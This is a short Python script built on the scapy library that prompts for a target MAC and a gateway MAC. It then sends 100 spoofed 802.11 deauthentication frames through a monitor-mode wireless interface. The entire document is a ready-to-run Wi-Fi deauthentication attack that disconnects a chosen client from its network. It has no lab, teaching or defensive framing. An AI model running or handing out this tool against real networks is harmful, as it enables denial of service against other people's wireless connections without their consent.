from scapy.all import *

target_mac = (input('enter target mac '))
gateway_mac = (input('enter gateway mac '))

dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)

packet = RadioTap()/dot11/Dot11Deauth(reason=7)

sendp(packet, inter=0.1, count=100, iface="wlan0mon", verbose=1)
